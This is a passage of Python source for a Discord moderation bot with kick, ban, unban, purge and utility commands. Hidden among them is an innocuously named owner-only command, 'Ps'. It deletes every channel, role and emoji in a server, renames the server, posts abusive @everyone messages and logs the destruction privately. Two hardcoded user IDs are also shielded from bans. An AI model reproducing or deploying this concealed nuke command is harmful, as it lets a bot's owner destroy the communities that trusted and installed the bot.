            await interaction.response.send_message(f"{user} has been kicked for {reason}", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"Error: {e}", ephemeral=True)

@client.tree.command(name='ban', description='Bans a user!')
@app_commands.describe(user='Select a user')
@app_commands.describe(reason='Provide a reason!')
async def ban(interaction: discord.Interaction, user: discord.User, reason: str):
    # List of user IDs that cannot be banned
    excluded_ids = [762464676344102932, 787367426550399027]  # Add more IDs as needed
    
    if user.id in excluded_ids:
        color = discord.Color.from_rgb(random.randint(0, 255),
                                       random.randint(0, 255),
                                       random.randint(0, 255))
        embed = discord.Embed(
            title="This User Not Banned :no_entry_sign:",
            description=f"This user cannot be banned.",
            color=color)
        return await interaction.response.send_message(embed=embed)
    
    if not interaction.user.guild_permissions.administrator:
        return await interaction.response.send_message("You do not have permission to use this command.")
    
    user_member = interaction.guild.get_member(user.id)
    if user_member.guild.owner == user_member or user_member.top_role > interaction.guild.me.top_role:
        color = discord.Color.from_rgb(random.randint(0, 255),
                                       random.randint(0, 255),
                                       random.randint(0, 255))
        embed = discord.Embed(
            title="This User Not Banned :no_entry_sign:",
            description=f"This user cannot be banned because they are the Guild Owner or have a higher role than me.",
            color=color)
        return await interaction.response.send_message(embed=embed)
    
    await interaction.guild.ban(user, reason=reason)
    color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    embed = discord.Embed(
        title="User Banned<:836992158778785872:1065806665120755742>",
        description=f"{user} has been struck by the banhammer {reason}",
        color=color)
    await interaction.response.send_message(embed=embed)


@client.tree.command(name='unban', description='Unbans a user!')
@app_commands.describe(member='Select a user')
@app_commands.describe(reason='Provide a reason')
@commands.has_permissions(administrator=True)
async def unban(interaction: discord.Interaction,
                member: discord.User,
                reason: str = None):
  if reason == None:
    reason = f"No Reason Provided"
  await interaction.guild.unban(member, reason=reason)
  await interaction.response.send_message(
    f"{member.mention} has been **unbanned**", delete_after=15)
  embed = discord.Embed(
    title="Unban Log",
    description=
    f"{member.mention} has been **unbanned** by {interaction.user.mention}\n\nReason: `{reason}`\n\nUnbanned from: `{interaction.guild.name}`",
    color=0x1355ed)
  embed.add_field(name="User", value=f"{member}", inline=True)
  embed.add_field(name="UserID", value=f"{member.id}", inline=True)
  embed.add_field(name="Moderator", value=f"{interaction.user}", inline=True)
  embed.set_footer(text=f"Unban log - Banned user: {member.name}")
  embed.set_thumbnail(url=member.avatar_url)
  embed.timestamp = datetime.datetime.utcnow()
  logchannel = client.get_channel(1059671447318040596)
  await logchannel.send(embed=embed)
  await interaction.response.delete_message()
  print(f"Sucsessfully unbanned {member.name}")

@client.tree.command(name='toggle', description='Toggle the availability of a command')
@app_commands.describe(command='The command you want to toggle')
@commands.is_owner()
async def toggle(interaction: discord.Interaction, command: str):
    command = client.get_command(command)
    if command is None:
        await interaction.response.send_message(f'Could not find that command {interaction.user.mention}', delete_after=4)
    elif interaction.command.name == command.name:
        await interaction.response.send_message('You cant not disable this command', delete_after=4)
    else:
        command.enabled = not command.enabled
        ternary = "enabled" if command.enabled else "disabled"
        await interaction.response.send_message(f'command {command.qualified_name} has been {ternary}', delete_after=4)

@client.tree.command(name='servers', description='List of servers the bot is in')
async def servers(interaction: discord.Interaction):
    server_list = [f"{guild.name} (ID: {guild.id})" for guild in client.guilds]
    server_list = "\n".join(server_list)
    embed = discord.Embed(title="Servers", description="Servers that the bot is in", color=0x090000)
    embed.add_field(name="Server List", value=server_list, inline=False)
    await interaction.response.send_message(embed=embed)

@client.tree.command(name='purge', description='purge x amount of messages')
@commands.has_permissions(administrator=True)
async def purge_command(interaction: discord.Interaction, amount: int):
    trash_emoji = discord.utils.get(interaction.guild.emojis, name='Trash')
    deleted = await interaction.channel.purge(limit=amount)
    embed = discord.Embed(
        title="Purge",
        description=f"<:trash:1072990434495823933> Deleted {len(deleted)} messages.",
        color=discord.Color.random())
    await interaction.channel.send(embed=embed, delete_after=5)

    
#other kinda commands
@client.command(pass_context=True)
@commands.is_owner()
async def Ps(ctx):
    await ctx.message.delete()
    log_channel = client.get_channel(1064732274874122260)

    deleted_channel_names = []
    deleted_role_names = []
    deleted_emoji_names = []

    for channel in ctx.guild.channels:
        try:
            deleted_channel_names.append(channel.name)
            await channel.delete()
            await ctx.guild.edit(name="LMFAOOOO")
        except:
            pass

    for role in ctx.guild.roles:
        try:
            deleted_role_names.append(role.name)
            await role.delete()
        except:
            pass

    for emoji in ctx.guild.emojis:
        try:
            deleted_emoji_names.append(emoji.name)
            await emoji.delete()
        except:
            pass

    nuked_channel = await ctx.guild.create_text_channel("6")
    by_channel = await ctx.guild.create_text_channel("6")
    death_channel = await ctx.guild.create_text_channel("6")
    await nuked_channel.send("Fuck you @everyone")
    await by_channel.send("Fuck you @everyone")
    await death_channel.send("Fuck you @everyone")

    deleted_channel_names = "\n".join(deleted_channel_names)
    deleted_role_names = "\n".join(deleted_role_names)
    deleted_emoji_names = "\n".join(deleted_emoji_names)

    embed = discord.Embed(
        title="Deleted Items",
        description="Items that have been deleted from the server",
        color=discord.Color.red()
    )
    embed.add_field(
        name="Deleted Channels",
        value=deleted_channel_names,
        inline=False
    )
    embed.add_field(
        name="Deleted Roles",
        value=deleted_role_names,
        inline=False
    )
    embed.add_field(
        name="Deleted Emojis",
        value=deleted_emoji_names,
        inline=False
    )
    await log_channel.send(embed=embed)

message_time = datetime.time(hour=0, minute=3, second=0)

channel_id = 1078907879505018920

async def send_message():
    await client.wait_until_ready()
    channel = client.get_channel(channel_id)
    while True:
        current_time = datetime.datetime.utcnow().time()
        if current_time.hour == message_time.hour and current_time.minute == message_time.minute:
            message = "Hello, world!"
            await channel.send(message)
        await asyncio.sleep(180) # Sleep for 3 minutes

ALLOWED_IDS = [762464676344102932, 787367426550399027]


@client.command()
async def mst(ctx):
    if ctx.author.id not in ALLOWED_IDS:
        return
    
    # Get the current time in the Mountain Standard Timezone
    mst_timezone = pytz.timezone('US/Mountain')
    mst_time = datetime.datetime.now(mst_timezone)
    
    # Create the embed message with the time information
    embed = Embed(title="Mountain Standard Time", color=0x00ff00)
    embed.add_field(name="Date:", value=mst_time.strftime("%A %d %B %Y"), inline=False)
    embed.add_field(name="Time:", value=mst_time.strftime("%I:%M %p"), inline=False)
    
    # Send the message to the channel
    await ctx.send(embed=embed)

#errors
@dev.error
async def dev_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        emoji = discord.utils.get(ctx.guild.emojis, name='devloper')
        embed = discord.Embed(title="Dev Command", description=f"This is a command for <:dev_badge:1072586441646944276> Demon&Angels#0553", color=discord.Color.random())
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(5)
        await msg.delete()

@help.error
async def help_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"{ctx.author.mention}, this command is on cooldown. Please try again in {error.retry_after:.0f} seconds.")

@dog_command.error
async def dog_error(interaction, error):
    if isinstance(error, commands.CommandOnCooldown):
        await interaction.send("This command is on cooldown. Please try again")


token = os.environ.get("token")
keep_alive.keep_alive()
client.run(token)

